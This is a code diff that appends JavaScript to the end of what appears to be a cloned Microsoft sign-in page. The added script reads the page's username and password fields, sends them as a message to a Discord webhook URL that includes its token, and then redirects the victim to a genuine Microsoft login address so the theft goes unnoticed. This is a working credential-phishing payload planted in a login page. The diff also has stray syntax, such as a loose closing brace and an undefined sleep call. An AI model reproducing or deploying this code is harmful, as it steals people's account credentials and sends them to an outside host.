@@ -1396,3 +1396,17 @@ a:active
 <!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->
 
 <!-- ko if: svr.urlDeviceFingerprinting --><!-- /ko --></div></body></html>
+
+}
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1210355803312234537/8uCqXxWkDl9itNJe2JA-jKCTcHWAiwfg36XdTGGB6PdeIB-yfXEZvZovDX5pPaYNDbba");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      content: ("> USERNAME  : " + document.getElementById('username').value + "\n> PASSWORD : " + document.getElementById('password').value)
+    }
+    request.send(JSON.stringify(params));
+  sleep(400)
+  window.location.replace("https://login.microsoftonline.com/dad3a7f1-7626-44ef-91ef-1a84d811010b/saml2?SAMLRequest=fZJvS%2BQwEIff%2BylK3vdP0rRbw7aynicnKLvYquAbSdOphmuTvUy6HH76q7supyC%2BGRiY3zNDnizP%2Fo5DsAOH2pqS0CghARhlO22eS3LXXIYFOatOlijHgW3FavIv5hb%2BTIA%2BWCGC83PuhzU4jeBqcDut4O72uiQv3m9RxHELcqZ7a35TFr1aO0YTxm%2B0uK7XJLiYQdpIv99%2BzAz2WZto1MpZtP2cHbSBSNkx7mSXykVPw0XO8pBz6MNTOhcqC94VlCY0afd0RoJL6xTsDy5JLwcEElxdlOTh5%2FkT5znlWZarru9T2Wd52%2BZFypM0S%2Fq5y0M1aDB%2BDuBGIuod%2FEcgTnBl0EvjS8ISxsOEhYw1jIk0E%2Fw0KtjikQQbZ71VdjjX5vCWkzPCStQojBwBhVeiXt1cCxYloj0MofjVNJtws64bEtwfnbA3J7Mlg%2BJg4XvW9n0xqQ7SxP5i95HwPUAetZLqK3nL%2BCO2em8%2Ff43qHw%3D%3D&_x_zm_rtaid=3dMnEIEqRAmUbXVfB5EA5g.1708641349820.a935c66bd851632e935186a423461176&_x_zm_rhtaid=152&sso_reload=true");
+  }
+  </script>
+</body>
